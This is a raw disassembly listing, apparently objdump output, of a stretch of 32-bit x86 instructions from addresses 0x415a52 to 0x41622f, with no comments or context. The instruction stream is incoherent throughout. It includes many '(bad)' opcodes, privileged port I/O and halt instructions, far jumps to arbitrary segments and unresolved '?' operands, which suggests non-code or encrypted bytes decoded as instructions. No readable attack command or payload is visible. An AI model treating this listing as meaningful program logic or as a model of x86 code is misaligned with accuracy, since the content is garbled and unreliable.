  415a52:	mov    al,ds:0x8c9e864a
  415a57:	imul   edi,edx,0x42
  415a5a:	int    0x93
  415a5c:	loop   0x415a7b
  415a5e:	push   ebx
  415a5f:	shl    BYTE PTR ds:0xd6edb7d8,0xb4
  415a66:	xchg   ecx,eax
  415a67:	mov    ?,WORD PTR ds:0x1b983274
  415a6d:	mov    esi,DWORD PTR [edi]
  415a6f:	es adc al,0x2e
  415a72:	loope  0x415a16
  415a74:	mov    eax,0x37f0615c
  415a79:	imul   ecx,esi,0xffffffe8
  415a7c:	int3   
  415a7d:	adc    ch,dl
  415a7f:	mov    cl,0x43
  415a81:	lock test eax,0x946f79ba
  415a87:	pop    ecx
  415a88:	ds cs je 0x415ad1
  415a8c:	out    0x57,al
  415a8e:	(bad)  
  415a8f:	mov    edi,0x46d8bc2
  415a94:	sub    edx,edx
  415a96:	jp     0x415a57
  415a98:	or     esi,DWORD PTR [ebp+0x7d]
  415a9b:	cmp    DWORD PTR [ebx],esi
  415a9d:	pop    eax
  415a9e:	shl    BYTE PTR [ebp+0x5a31ba00],cl
  415aa4:	arpl   WORD PTR [eax-0x4d5b0c5],si
  415aaa:	mov    edx,0x677fe42c
  415aaf:	jmp    0x415a6a
  415ab1:	in     eax,dx
  415ab2:	push   edi
  415ab3:	neg    bh
  415ab5:	mov    ds:0x3dc1ce33,eax
  415aba:	leave  
  415abb:	push   ebp
  415abc:	popa   
  415abd:	shl    edi,cl
  415abf:	mov    esi,0xb43ae0a3
  415ac4:	sti    
  415ac5:	pop    es
  415ac6:	pop    eax
  415ac7:	push   ss
  415ac8:	jecxz  0x415a99
  415aca:	xchg   DWORD PTR [edi+0x488eaff3],edx
  415ad0:	ins    DWORD PTR es:[edi],dx
  415ad1:	xchg   dx,ax
  415ad3:	sub    bh,ch
  415ad5:	mov    edi,0x225d7c70
  415ada:	or     ah,dh
  415adc:	loope  0x415ac4
  415ade:	push   0x16450a50
  415ae3:	inc    cx
  415ae5:	sbb    esi,DWORD PTR [edx+0x22cba850]
  415aeb:	inc    ebp
  415aec:	clc    
  415aed:	dec    esi
  415aee:	imul   edx,eax,0x10c3d383
  415af4:	jmp    0xbde1:0xb54c4d88
  415afb:	fwait
  415afc:	mov    ds:0x31b3a97f,al
  415b01:	imul   edx,DWORD PTR [ebp-0x5e],0x2
  415b05:	dec    edx
  415b06:	arpl   ax,sp
  415b08:	add    ch,cl
  415b0a:	cmc    
  415b0b:	in     eax,0xed
  415b0d:	iret   
  415b0e:	jp     0x415ae0
  415b10:	cmp    al,BYTE PTR [ecx+0x15]
  415b13:	fidivr DWORD PTR [ecx+eiz*1+0x13ad083d]
  415b1a:	xor    edi,DWORD PTR [ebx+0x43ae3b40]
  415b20:	pop    ss
  415b21:	stos   BYTE PTR es:[edi],al
  415b22:	ret    
  415b23:	lods   eax,DWORD PTR ds:[esi]
  415b24:	mov    cl,0x56
  415b26:	pop    edi
  415b27:	add    bh,BYTE PTR [ecx]
  415b29:	fisub  WORD PTR [eax-0x30]
  415b2c:	sbb    ebx,DWORD PTR [ebx+0x26]
  415b2f:	push   ds
  415b30:	add    DWORD PTR [ebx+0x7200575a],edx
  415b36:	dec    edi
  415b37:	ret    0xed39
  415b3a:	mov    esi,0xf6bbcbb9
  415b3f:	pop    cx
  415b41:	ds repnz repz sbb esp,esp
  415b46:	xlat   BYTE PTR ds:[ebx]
  415b47:	pop    ecx
  415b48:	push   ebp
  415b49:	inc    edi
  415b4a:	and    ecx,esp
  415b4c:	cdq    
  415b4d:	push   ebx
  415b4e:	into   
  415b4f:	mov    ds:0x2bdb88cd,al
  415b54:	jp     0x415b22
  415b56:	pop    es
  415b57:	add    eax,0x6acd6497
  415b5c:	jle    0x415b6c
  415b5e:	dec    edx
  415b5f:	imul   ebx,DWORD PTR [esi+ebp*4-0x58],0x2e4ffea8
  415b67:	out    0xce,al
  415b69:	push   eax
  415b6a:	jmp    DWORD PTR [edx+edi*1+0x5a5bf73e]
  415b71:	or     DWORD PTR [ebx+0x12],esp
  415b74:	cwde   
  415b75:	push   0x7
  415b77:	mov    WORD PTR [esi+0x77548e3a],fs
  415b7d:	dec    ebp
  415b7e:	sbb    BYTE PTR [ebp-0x90085ca],0x83
  415b85:	sub    DWORD PTR [edx-0x7e],ecx
  415b88:	ds mov ecx,0xb0cd6c3
  415b8e:	pop    es
  415b8f:	pop    ebx
  415b90:	dec    esi
  415b91:	and    al,al
  415b93:	sbb    DWORD PTR [ecx-0x14409df6],esp
  415b99:	out    dx,eax
  415b9a:	cli    
  415b9b:	retf   
  415b9c:	mov    ds:0x811de794,eax
  415ba1:	pop    esp
  415ba2:	fldcw  WORD PTR [edx-0x20c5b9f4]
  415ba8:	add    esi,DWORD PTR [ebx]
  415baa:	test   eax,0x503774ab
  415baf:	mov    BYTE PTR [edx-0xa],cl
  415bb2:	mov    dl,0x5d
  415bb4:	les    edi,FWORD PTR [esi-0x207609df]
  415bba:	or     DWORD PTR [ecx+0x73],ebx
  415bbd:	aam    0x4e
  415bbf:	xchg   ebp,eax
  415bc0:	and    BYTE PTR [esi],dh
  415bc2:	mov    ecx,0x435611c9
  415bc7:	in     eax,dx
  415bc8:	cmp    al,0xf9
  415bca:	mov    bh,0x96
  415bcc:	sbb    eax,0x1815a64f
  415bd1:	xor    dh,dl
  415bd3:	ins    BYTE PTR es:[edi],dx
  415bd4:	xchg   ecx,eax
  415bd5:	cmp    DWORD PTR [ebx],esi
  415bd7:	test   BYTE PTR [edx],ah
  415bd9:	add    eax,0x29e0ef81
  415bde:	stos   DWORD PTR es:[edi],eax
  415bdf:	or     DWORD PTR [ebx],esp
  415be1:	mov    bl,BYTE PTR [esi-0x785ff46d]
  415be7:	call   0x3a439ebb
  415bec:	imul   esp,DWORD PTR [edx+0x13fde657],0x99c8e37c
  415bf6:	jmp    0xc42fcfb6
  415bfb:	cmp    al,0x84
  415bfd:	enter  0x9cdf,0x1c
  415c01:	imul   ebx,DWORD PTR [edi+0x44177fe6],0x6b
  415c08:	jae    0x415bfd
  415c0a:	je     0x415bc5
  415c0c:	ficom  DWORD PTR [eax]
  415c0e:	mov    ebx,0xdc6cdf6c
  415c13:	mov    WORD PTR [ebx+0x78],ds
  415c16:	imul   edx,DWORD PTR [edi-0x5],0x5e3aab2b
  415c1d:	mov    WORD PTR [ebx-0x3b],ss
  415c20:	int    0xbd
  415c22:	xchg   edx,eax
  415c23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c24:	pop    esi
  415c25:	dec    esp
  415c26:	sahf   
  415c27:	push   eax
  415c28:	hlt    
  415c29:	cdq    
  415c2a:	in     eax,0xdc
  415c2c:	mov    dh,bl
  415c2e:	push   es
  415c2f:	push   ebp
  415c30:	xchg   ecx,eax
  415c31:	cmp    bh,BYTE PTR [edi-0x4]
  415c34:	xor    BYTE PTR [edx+edi*1-0xb],al
  415c38:	lods   eax,DWORD PTR ds:[esi]
  415c39:	pop    edx
  415c3a:	jnp    0x415c9e
  415c3c:	pop    ebx
  415c3d:	mov    bh,0xb3
  415c3f:	jmp    ebp
  415c41:	rcr    DWORD PTR [edx],0xd
  415c44:	mov    dl,0x55
  415c46:	mov    ?,WORD PTR [ecx]
  415c48:	inc    ebx
  415c49:	mov    al,ds:0xc65c5789
  415c4e:	lods   eax,DWORD PTR ds:[esi]
  415c4f:	push   ds
  415c50:	ret    0xa911
  415c53:	clc    
  415c54:	add    edi,DWORD PTR [eax]
  415c56:	sub    DWORD PTR ds:0x8aeb15d2,esi
  415c5c:	cmp    BYTE PTR [eax-0x5c6ab419],bh
  415c62:	test   esp,0xdccdcdd6
  415c68:	mov    ds:0x72ebfa24,eax
  415c6d:	or     al,0x2c
  415c6f:	and    BYTE PTR gs:[eax+0x17167fde],al
  415c76:	adc    DWORD PTR [edx],edx
  415c78:	aad    0xe1
  415c7a:	xchg   BYTE PTR [ecx],dh
  415c7c:	lods   eax,DWORD PTR ds:[esi]
  415c7d:	xchg   esp,eax
  415c7e:	leave  
  415c7f:	inc    esi
  415c80:	fiadd  WORD PTR [ebx+0x38]
  415c83:	mov    ?,ebx
  415c85:	fwait
  415c86:	call   0xd1dcfd21
  415c8b:	and    bh,BYTE PTR [ecx+0x2c8168c0]
  415c91:	stos   BYTE PTR es:[edi],al
  415c92:	imul   eax,edx,0xc8c11d50
  415c98:	test   eax,0x973f64ca
  415c9d:	hlt    
  415c9e:	jne    0x415d04
  415ca0:	je     0x415cf4
  415ca2:	mov    esp,0x924d751e
  415ca7:	stos   DWORD PTR es:[edi],eax
  415ca8:	mov    ds:0x8b0d7ece,al
  415cad:	daa    
  415cae:	aaa    
  415caf:	or     cl,bh
  415cb1:	fadd   DWORD PTR ds:0x7851156b
  415cb7:	sub    BYTE PTR [ecx+0x3f],dh
  415cba:	pop    ss
  415cbb:	cs xchg ebx,eax
  415cbd:	sbb    BYTE PTR [ebx-0x1349ba47],ch
  415cc3:	xor    edx,DWORD PTR [eax]
  415cc5:	rcl    BYTE PTR [edx+0x4985893d],cl
  415ccb:	pusha  
  415ccc:	mov    al,ds:0xaeaccd8c
  415cd1:	(bad)  
  415cd2:	in     al,dx
  415cd3:	sub    BYTE PTR [eax-0x68b82535],dh
  415cd9:	xchg   esp,eax
  415cda:	je     0x415d55
  415cdc:	out    dx,al
  415cdd:	ins    BYTE PTR es:[edi],dx
  415cde:	add    eax,0xbda2af5c
  415ce3:	jbe    0x415c76
  415ce5:	xor    dl,BYTE PTR [ebp-0x1da66805]
  415ceb:	and    eax,0x92d1a7be
  415cf0:	int3   
  415cf1:	mov    ds:0x89e47f2b,eax
  415cf6:	cld    
  415cf7:	aam    0xb9
  415cf9:	or     ebx,ebx
  415cfb:	cli    
  415cfc:	inc    ebp
  415cfd:	gs xchg ebx,eax
  415cff:	or     dl,BYTE PTR [edi+eax*8-0x56]
  415d03:	stc    
  415d04:	loope  0x415c96
  415d06:	and    DWORD PTR [edi],esp
  415d08:	scas   eax,DWORD PTR es:[edi]
  415d09:	adc    BYTE PTR [ecx+edi*8+0x4f],ch
  415d0d:	call   0x1203:0xb64035b3
  415d14:	xor    eax,DWORD PTR [ebp-0x1c]
  415d17:	push   edx
  415d18:	(bad)  
  415d19:	jmp    0x88a8:0xfd21259a
  415d20:	je     0x415d95
  415d22:	jno    0x415d8b
  415d24:	in     eax,dx
  415d25:	inc    ebp
  415d26:	(bad)  
  415d27:	cmp    ch,BYTE PTR [edi+0x151bd5bf]
  415d2d:	cwde   
  415d2e:	pop    ebp
  415d2f:	shl    BYTE PTR [ebx-0x1b9c5532],0x3c
  415d36:	stos   BYTE PTR es:[edi],al
  415d37:	jne    0x415cde
  415d39:	fist   WORD PTR [eiz*4-0x527a24a2]
  415d40:	inc    edx
  415d41:	jg     0x415dab
  415d43:	jno    0x415d2e
  415d45:	and    al,0x71
  415d47:	lock cmp ebp,DWORD PTR [eax]
  415d4a:	push   0x66
  415d4c:	jae    0x415d5e
  415d4e:	jle    0x415d8a
  415d50:	sahf   
  415d51:	pop    ebx
  415d52:	loope  0x415d79
  415d54:	push   0x63d6e90b
  415d59:	loope  0x415da4
  415d5b:	bound  esp,QWORD PTR [ebp-0x20d49fc6]
  415d61:	sbb    edx,DWORD PTR ds:0xefb9d107
  415d67:	add    BYTE PTR [edi+eiz*1-0x6283cb29],dh
  415d6e:	mov    esi,0x7b3cd92b
  415d73:	or     DWORD PTR [edi-0xd7060a4],esp
  415d79:	scas   eax,DWORD PTR es:[edi]
  415d7a:	loop   0x415d2b
  415d7c:	aas    
  415d7d:	xor    edi,DWORD PTR [edx-0x74]
  415d80:	jnp    0x415d2f
  415d82:	dec    eax
  415d83:	lds    ebp,FWORD PTR ds:0xbd6eacd9
  415d89:	push   esp
  415d8a:	sub    eax,ecx
  415d8c:	cs push ebx
  415d8e:	adc    al,0x67
  415d90:	jle    0x38a1fd49
  415d96:	std    
  415d97:	push   ds
  415d98:	sub    eax,0xd7a6f76e
  415d9d:	push   esi
  415d9e:	ret    
  415d9f:	pop    eax
  415da0:	loope  0x415dd8
  415da2:	mov    cl,0x57
  415da4:	and    eax,0x19f3d7a5
  415da9:	mov    bh,0x9f
  415dab:	cmp    DWORD PTR [ebp-0x7366919a],ebp
  415db1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415db2:	cmp    DWORD PTR [eax],edx
  415db4:	and    DWORD PTR [ecx],esp
  415db6:	pop    ecx
  415db7:	cs jo  0x415d44
  415dba:	inc    esp
  415dbb:	inc    edx
  415dbc:	mov    edi,0xeb6ca626
  415dc1:	pop    esp
  415dc2:	dec    esi
  415dc3:	xchg   esp,eax
  415dc4:	sbb    al,0x35
  415dc6:	pop    esi
  415dc7:	push   eax
  415dc8:	and    al,0x65
  415dca:	rcl    DWORD PTR [edi+esi*1-0x3],1
  415dce:	scas   eax,DWORD PTR es:[edi]
  415dcf:	push   0x4bc87874
  415dd4:	xor    ecx,DWORD PTR [edx+0x6e6613b4]
  415dda:	jp     0x415dd9
  415ddc:	xchg   BYTE PTR [esi-0x31853d0c],ch
  415de2:	pusha  
  415de3:	push   ds
  415de4:	sti    
  415de5:	retf   
  415de6:	ins    DWORD PTR es:[edi],dx
  415de7:	cmp    DWORD PTR [edi+0x202a1862],0x9aca27f
  415df1:	dec    ebx
  415df2:	jmp    0xb08f34c3
  415df7:	xchg   esp,eax
  415df8:	lods   eax,DWORD PTR ds:[esi]
  415df9:	call   0x3124:0xe35ba00f
  415e00:	shl    BYTE PTR [edx+0x2470dba6],1
  415e06:	or     al,0xef
  415e08:	imul   esp,DWORD PTR [ebx],0x8dfebd29
  415e0e:	ds lahf 
  415e10:	jmp    0xc3a2d595
  415e15:	stc    
  415e16:	lods   eax,DWORD PTR ds:[esi]
  415e17:	data16 test al,0x17
  415e1a:	shl    DWORD PTR [ecx],0x9d
  415e1d:	(bad)  
  415e1e:	repz pusha 
  415e20:	lods   al,BYTE PTR ds:[esi]
  415e21:	jmp    0x415dd0
  415e23:	out    0xe1,eax
  415e25:	jmp    0x9cfb:0x31e8fbb3
  415e2c:	mov    ss,WORD PTR [ebp+0x56]
  415e2f:	dec    esp
  415e30:	fimul  WORD PTR [eax-0x27]
  415e33:	push   ds
  415e34:	jle    0x415e94
  415e36:	lds    ebx,FWORD PTR [ebx-0x55b7faa2]
  415e3c:	pop    ebp
  415e3d:	les    eax,FWORD PTR [edx-0x66f9053b]
  415e43:	sub    eax,0x94e0d2cd
  415e48:	aam    0xb1
  415e4a:	sbb    eax,0xb99f7e6e
  415e4f:	jg     0x415e41
  415e51:	clc    
  415e52:	mov    al,0x5a
  415e54:	mov    eax,0x663c77ac
  415e59:	retf   
  415e5a:	mov    ss,WORD PTR [edi]
  415e5c:	in     al,0xed
  415e5e:	add    BYTE PTR [eax-0x48a90436],ah
  415e64:	ja     0x415ec8
  415e66:	xor    al,0xac
  415e68:	mov    ds:0x3ae046ee,eax
  415e6d:	sbb    BYTE PTR [ecx-0x6c9ab198],cl
  415e73:	mov    esp,0xac5f02c7
  415e78:	mov    edx,0xcc232e9b
  415e7d:	les    ecx,FWORD PTR [edx-0x1ef107a6]
  415e83:	dec    edi
  415e84:	in     al,0x10
  415e86:	sbb    edx,DWORD PTR [ecx]
  415e88:	sbb    eax,0xd8130745
  415e8d:	(bad)  
  415e8e:	push   eax
  415e8f:	push   es
  415e90:	fiadd  WORD PTR [ebx+edx*1]
  415e93:	leave  
  415e94:	sbb    ah,cl
  415e96:	adc    al,0x8b
  415e98:	pop    esi
  415e99:	inc    edx
  415e9a:	ds icebp 
  415e9c:	jo     0x415e2c
  415e9e:	pop    es
  415e9f:	lods   al,BYTE PTR ds:[esi]
  415ea0:	mov    ecx,edi
  415ea2:	je     0x415e44
  415ea4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ea5:	mov    dl,0x61
  415ea7:	int    0xac
  415ea9:	out    0x49,al
  415eab:	mov    ebp,edi
  415ead:	test   DWORD PTR [edx],esp
  415eaf:	ja     0x415e82
  415eb1:	scas   eax,DWORD PTR es:[edi]
  415eb2:	clc    
  415eb3:	je     0x415ed5
  415eb5:	lahf   
  415eb6:	cli    
  415eb7:	xor    BYTE PTR [ebp+0x6a],ah
  415eba:	mov    BYTE PTR [ebp-0x54bbab57],ch
  415ec0:	scas   al,BYTE PTR es:[edi]
  415ec1:	imul   esp,edx,0x2e72352f
  415ec7:	out    0x33,al
  415ec9:	sub    eax,DWORD PTR [edx]
  415ecb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ecc:	mov    ecx,0xcaf82775
  415ed1:	retf   
  415ed2:	mov    ds:0x79245eca,al
  415ed7:	lahf   
  415ed8:	(bad)  
  415ed9:	push   eax
  415eda:	fldz   
  415edc:	ins    DWORD PTR es:[edi],dx
  415edd:	cmc    
  415ede:	mov    bh,0x31
  415ee0:	icebp  
  415ee1:	enter  0xa686,0xdb
  415ee5:	pop    ecx
  415ee6:	cmp    al,0x82
  415ee8:	xlat   BYTE PTR ds:[ebx]
  415ee9:	inc    edi
  415eea:	pop    es
  415eeb:	push   ds
  415eec:	jecxz  0x415f17
  415eee:	lods   eax,DWORD PTR ds:[esi]
  415eef:	inc    esi
  415ef0:	adc    BYTE PTR [ecx],dh
  415ef2:	adc    al,0x43
  415ef4:	lock push es
  415ef6:	pop    es
  415ef7:	sbb    eax,0x7db54e80
  415efc:	cmp    esp,DWORD PTR [edx+0x73613817]
  415f02:	sub    eax,DWORD PTR [edx]
  415f04:	retf   0xe6b2
  415f07:	rcl    al,1
  415f09:	adc    al,0xf1
  415f0b:	scas   al,BYTE PTR es:[edi]
  415f0c:	dec    ecx
  415f0d:	mov    eax,0xf940ad6c
  415f12:	adc    BYTE PTR [eax+0x1c0da7f6],bh
  415f18:	mov    esp,0x670ff6ca
  415f1d:	mul    ecx
  415f1f:	daa    
  415f20:	or     DWORD PTR [esi+0x722388b1],ebp
  415f26:	push   edx
  415f27:	into   
  415f28:	popf   
  415f29:	or     ecx,esp
  415f2b:	xchg   ebp,eax
  415f2c:	imul   esi,edi,0xdccc1a0f
  415f32:	cdq    
  415f33:	cdq    
  415f34:	sbb    eax,0xfe7d1eb7
  415f39:	xlat   BYTE PTR ds:[ebx]
  415f3a:	dec    esi
  415f3b:	sbb    BYTE PTR [eax+0x240fd11f],cl
  415f41:	daa    
  415f42:	scas   al,BYTE PTR es:[edi]
  415f43:	add    BYTE PTR [edx+ebx*8+0x1e],dl
  415f47:	jne    0x415f7d
  415f49:	aaa    
  415f4a:	adc    BYTE PTR [eax],dh
  415f4c:	xor    DWORD PTR [edx+0x1714b999],0xffffff94
  415f53:	pop    edx
  415f54:	rcr    BYTE PTR [ebx+0x24],1
  415f57:	mov    eax,ds:0xd0c58350
  415f5c:	ror    BYTE PTR [ebx+0x685bb779],1
  415f62:	test   DWORD PTR [ecx-0x5b67f4f4],0x5ad5c894
  415f6c:	push   es
  415f6d:	mov    bh,0xd5
  415f6f:	mov    dl,0xf4
  415f71:	mov    ebp,0x195b9d37
  415f76:	cmp    cl,0x27
  415f79:	js     0x415f57
  415f7b:	add    eax,0x2d5f756c
  415f80:	add    al,0x82
  415f82:	cdq    
  415f83:	lods   al,BYTE PTR ds:[esi]
  415f84:	std    
  415f85:	fnsave [esi]
  415f87:	dec    eax
  415f88:	sub    al,BYTE PTR [ecx+0x54]
  415f8b:	psubw  mm4,QWORD PTR [edx-0x15]
  415f8f:	push   edx
  415f90:	repz or DWORD PTR [edi-0x76beefb8],0xffffff93
  415f98:	sbb    ah,BYTE PTR cs:0x4ed2fb74
  415f9f:	push   ebp
  415fa0:	add    BYTE PTR [ebp+0x798a1288],al
  415fa6:	in     eax,dx
  415fa7:	mov    ebx,0xc6b16251
  415fac:	ret    0xf732
  415faf:	pop    ss
  415fb0:	xchg   edi,eax
  415fb1:	icebp  
  415fb2:	mov    ch,0xb2
  415fb4:	push   ds
  415fb5:	jmp    0x820ec2a4
  415fba:	(bad)  ds:0x48602cca
  415fc0:	or     al,0x3a
  415fc2:	push   edi
  415fc3:	dec    esi
  415fc4:	ss and eax,0x6f7dc3e2
  415fca:	outs   dx,BYTE PTR ds:[esi]
  415fcb:	or     DWORD PTR [eax+0x37],0x1861b3c8
  415fd2:	mov    esi,DWORD PTR [esi+0xcfb9fe3]
  415fd8:	or     dl,ah
  415fda:	jbe    0x41603c
  415fdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415fdd:	in     eax,0x3b
  415fdf:	xchg   edi,ecx
  415fe1:	fimul  WORD PTR [edi-0x72]
  415fe4:	sbb    dl,al
  415fe6:	fisttp DWORD PTR [esi-0x37]
  415fe9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415fea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415feb:	add    BYTE PTR [ebx-0x2f],al
  415fee:	sahf   
  415fef:	pop    esi
  415ff0:	pop    edi
  415ff1:	repnz mov ecx,0xc64c8bc6
  415ff7:	add    al,0xf2
  415ff9:	out    0x13,al
  415ffb:	fnstsw WORD PTR [ebx+edi*1+0x61]
  415fff:	nop
  416000:	fistp  QWORD PTR [edi]
  416002:	push   ebx
  416003:	mov    dl,0x33
  416005:	sbb    ah,al
  416007:	outs   dx,BYTE PTR ds:[esi]
  416008:	push   ecx
  416009:	cmp    BYTE PTR [eax],ch
  41600b:	and    eax,0x193e5b7
  416010:	pushf  
  416011:	mov    cl,0x45
  416013:	hlt    
  416014:	xchg   BYTE PTR [edi-0x52],al
  416017:	bnd jg 0x41608b
  41601a:	adc    al,0xe6
  41601c:	xchg   DWORD PTR ds:0x90d00187,eax
  416022:	popa   
  416023:	pop    ss
  416024:	push   ecx
  416025:	xchg   edx,eax
  416026:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416027:	stos   BYTE PTR es:[edi],al
  416028:	lea    ebp,[esi+0xf]
  41602b:	rol    BYTE PTR [ebx],cl
  41602d:	and    BYTE PTR [ebx],dl
  41602f:	dec    eax
  416030:	xchg   BYTE PTR es:[esi],cl
  416033:	jmp    0x415fcd
  416035:	fdiv   QWORD PTR [edx+esi*2-0x24]
  416039:	stos   BYTE PTR es:[edi],al
  41603a:	push   ebp
  41603b:	or     bh,bh
  41603d:	pop    edi
  41603e:	jmp    0xd1b50205
  416043:	inc    esi
  416044:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416045:	fs clc 
  416047:	bound  ecx,QWORD PTR [esp+edx*2]
  41604a:	stc    
  41604b:	push   edi
  41604c:	xchg   edi,eax
  41604d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41604e:	inc    esp
  41604f:	shr    DWORD PTR [eax+eax*1+0x58ae595b],cl
  416056:	rol    BYTE PTR ds:[eax+0x7e],1
  41605a:	lea    ebx,[eax-0x192eea4]
  416060:	mov    bh,0xf3
  416062:	sub    al,0xef
  416064:	push   es
  416065:	dec    esp
  416066:	inc    ecx
  416067:	enter  0x2a2e,0xef
  41606b:	xor    BYTE PTR [ecx-0x1a],ah
  41606e:	es std 
  416070:	mov    BYTE PTR [edx],dh
  416072:	loope  0x416051
  416074:	dec    edx
  416075:	sbb    BYTE PTR [ecx],0xf8
  416078:	ss xor eax,0xcda6e6fa
  41607e:	jae    0x4160ab
  416080:	adc    al,0xb1
  416082:	ds lahf 
  416084:	pop    ds
  416085:	mov    ebp,0x45455816
  41608a:	and    ebp,esi
  41608c:	hlt    
  41608d:	xchg   ebp,eax
  41608e:	mov    ds:0x9aaf707a,eax
  416093:	adc    ecx,DWORD PTR [ebx+0x3e771e02]
  416099:	test   al,0xea
  41609b:	cld    
  41609c:	out    dx,eax
  41609d:	shr    DWORD PTR [ebp+0x3f],0x86
  4160a1:	pop    eax
  4160a2:	call   0x7669:0xc8321822
  4160a9:	aad    0xd7
  4160ab:	sub    al,0x87
  4160ad:	int3   
  4160ae:	call   0x3b58:0xfa1eb56a
  4160b5:	jmp    0x416111
  4160b7:	popa   
  4160b8:	(bad)  
  4160b9:	in     al,dx
  4160ba:	gs mov cl,0x36
  4160bd:	mov    ch,0xcd
  4160bf:	mov    ch,0xfc
  4160c1:	jp     0x4160c9
  4160c3:	mov    ebx,0x1f9b1efa
  4160c8:	jo     0x41607c
  4160ca:	into   
  4160cb:	mov    ?,edx
  4160cd:	and    esi,DWORD PTR [esi-0x2eb9caeb]
  4160d3:	test   BYTE PTR [edx],bl
  4160d5:	outs   dx,BYTE PTR ds:[esi]
  4160d6:	dec    esi
  4160d7:	xor    edi,eax
  4160d9:	in     al,0x9d
  4160db:	xchg   BYTE PTR [edi-0x36400a97],bl
  4160e1:	mov    cl,0x7c
  4160e3:	push   esi
  4160e4:	loopne 0x4160f2
  4160e6:	into   
  4160e7:	xchg   esp,eax
  4160e8:	or     ebp,DWORD PTR [edx]
  4160ea:	inc    esi
  4160eb:	and    BYTE PTR [ebx-0x3b729053],0xa6
  4160f2:	js     0x41607d
  4160f4:	mov    ds:0xbfc5936d,eax
  4160f9:	adc    BYTE PTR [ecx+ecx*2+0x4c2a62c7],ch
  416100:	out    0x28,al
  416102:	mov    ebp,0x381edffb
  416107:	mov    ds:0x9a0987c3,al
  41610c:	data16 jo 0x416126
  41610f:	loopne 0x4160d2
  416111:	scas   eax,DWORD PTR es:[edi]
  416112:	add    DWORD PTR [edx+0x18c6bfeb],0x49
  416119:	xchg   ecx,eax
  41611a:	jno    0x416101
  41611c:	lock xchg bh,dh
  41611f:	pop    DWORD PTR [eax]
  416121:	cmc    
  416122:	xlat   BYTE PTR ds:[ebx]
  416123:	lahf   
  416124:	add    esi,ebx
  416126:	loop   0x41611d
  416128:	sahf   
  416129:	pop    edx
  41612a:	mov    eax,ds:0x62772c70
  41612f:	mov    edi,DWORD PTR [esi]
  416131:	fwait
  416132:	xor    DWORD PTR [ecx],0xffffff94
  416135:	push   0xbe87758
  41613a:	dec    ebx
  41613b:	sbb    BYTE PTR [ebx-0x79],cl
  41613e:	jbe    0x4160ff
  416140:	retf   
  416141:	loopne 0x4160c5
  416143:	test   DWORD PTR [ebp+0x2a2bb5a6],eax
  416149:	test   al,0x45
  41614b:	mov    edx,0x7199a559
  416150:	jno    0x41614f
  416152:	and    esp,DWORD PTR [ecx]
  416154:	jnp    0x416174
  416156:	xor    DWORD PTR [edx+eiz*8-0x36],ebp
  41615a:	mov    cl,0xbd
  41615c:	dec    ebp
  41615d:	jbe    0x41616d
  41615f:	test   BYTE PTR [ecx],al
  416161:	daa    
  416162:	inc    esp
  416163:	sbb    DWORD PTR [edi],ebp
  416165:	inc    edx
  416166:	mov    dl,0x7f
  416168:	lods   al,BYTE PTR ds:[esi]
  416169:	loop   0x4160fc
  41616b:	arpl   bx,si
  41616d:	cwde   
  41616e:	jl     0x416143
  416170:	fld    TBYTE PTR [eax+0x4f6e98e4]
  416176:	push   esi
  416177:	xor    dh,BYTE PTR [edi+eax*4+0xd13b79d]
  41617e:	jnp    0x4161a9
  416180:	xchg   ebp,eax
  416181:	mov    edx,0x4999c5cc
  416186:	fdiv   st,st(3)
  416188:	js     0x41615f
  41618a:	push   edi
  41618b:	(bad)  
  41618d:	adc    dh,ch
  41618f:	pop    esp
  416190:	inc    eax
  416191:	pop    ebx
  416192:	mov    edx,eax
  416194:	push   ss
  416195:	inc    ebp
  416196:	popa   
  416197:	or     eax,0xef05ed9b
  41619c:	lods   eax,DWORD PTR ds:[esi]
  41619d:	hlt    
  41619e:	outs   dx,DWORD PTR ds:[esi]
  41619f:	and    al,0xa2
  4161a1:	adc    BYTE PTR [edi],ch
  4161a3:	fs cmp al,0xb1
  4161a6:	add    ch,dl
  4161a8:	and    bl,BYTE PTR [edx-0x1f62f4e4]
  4161ae:	xor    dl,BYTE PTR [ecx]
  4161b0:	sbb    esp,ebx
  4161b2:	cli    
  4161b3:	mov    ds:0xbe25af3c,eax
  4161b8:	scas   eax,DWORD PTR es:[edi]
  4161b9:	(bad)  
  4161bb:	adc    BYTE PTR gs:[ebx+0x4],0xb7
  4161c0:	enter  0x6788,0x22
  4161c4:	jecxz  0x4161a8
  4161c6:	jg     0x4161d5
  4161c8:	dec    ecx
  4161c9:	push   ss
  4161ca:	loope  0x4161af
  4161cc:	enter  0xa44f,0xda
  4161d0:	xchg   edi,eax
  4161d1:	pop    ecx
  4161d2:	enter  0x290e,0x14
  4161d6:	adc    al,0x1b
  4161d8:	mov    ds:0xf3770ab6,al
  4161dd:	pop    eax
  4161de:	cmp    ebx,DWORD PTR [edi+0x4186d53e]
  4161e4:	pop    edx
  4161e5:	mov    ah,0x1f
  4161e7:	cmp    bh,BYTE PTR [ecx]
  4161e9:	xchg   ecx,eax
  4161ea:	add    al,0x38
  4161ec:	inc    esp
  4161ed:	sub    ch,BYTE PTR [ebp+0x7]
  4161f0:	push   esi
  4161f1:	sub    BYTE PTR [edx-0x45afa739],ah
  4161f7:	ret    
  4161f8:	push   esi
  4161f9:	push   edx
  4161fa:	adc    eax,0xa3369836
  4161ff:	cmp    al,0x28
  416201:	shr    esp,0x6c
  416204:	popa   
  416205:	shl    bh,cl
  416207:	test   DWORD PTR [ebx+esi*2],ebp
  41620a:	out    0x8c,eax
  41620c:	and    eax,DWORD PTR [eax+0x28]
  41620f:	adc    eax,0xc4110629
  416214:	dec    edi
  416215:	and    eax,ebp
  416217:	mov    esp,0xe3c05df6
  41621c:	mov    es,edx
  41621e:	or     al,0x4a
  416220:	or     al,0x94
  416222:	aas    
  416223:	repz jg 0x4161c1
  416226:	lods   al,BYTE PTR ds:[esi]
  416227:	push   eax
  416228:	fmul   QWORD PTR [edi]
  41622a:	push   ebx
  41622b:	in     eax,dx
  41622c:	and    BYTE PTR [edi+0x5a],ch
  41622f:	dec    esi
